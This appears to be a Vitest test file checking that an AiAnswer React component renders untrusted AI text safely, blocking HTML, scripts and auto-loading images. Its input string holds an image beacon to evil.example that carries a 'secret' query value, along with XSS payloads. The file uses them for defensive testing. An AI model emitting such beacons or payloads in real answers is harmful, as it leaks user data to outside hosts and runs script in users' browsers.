// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from "vitest";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { AiAnswer } from "@plainva/ui";

let root: Root | null = null;
let host: HTMLElement | null = null;

afterEach(() => {
  act(() => root?.unmount());
  host?.remove();
  root = null;
  host = null;
});

function mount(node: React.ReactElement): HTMLElement {
  host = document.createElement("div");
  document.body.appendChild(host);
  root = createRoot(host);
  act(() => root!.render(node));
  return host;
}

describe("AiAnswer", () => {
  it("renders untrusted text as elements: no HTML, no image that loads, links only through the handlers", () => {
    const onOpenNote = vi.fn();
    const onOpenUrl = vi.fn();
    const container = mount(
      <AiAnswer
        text={"See [[Offer 2026]] and ![beacon](https://evil.example/p.png?d=secret).\n\n<img src=x onerror=alert(1)><script>alert(2)</script>\n\n- [ ] open task"}
        onOpenNote={onOpenNote}
        onOpenUrl={onOpenUrl}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("input")).toBeNull();
    expect(container.textContent).toContain("<img src=x onerror=alert(1)>");
    const [wiki, beacon] = Array.from(container.querySelectorAll("a"));
    act(() => wiki!.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true })));
    expect(onOpenNote).toHaveBeenCalledWith("Offer 2026");
    act(() => beacon!.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true })));
    expect(onOpenUrl).toHaveBeenCalledWith("https://evil.example/p.png?d=secret");
    expect(container.querySelector(".pv-ai-box")).not.toBeNull();
  });
});
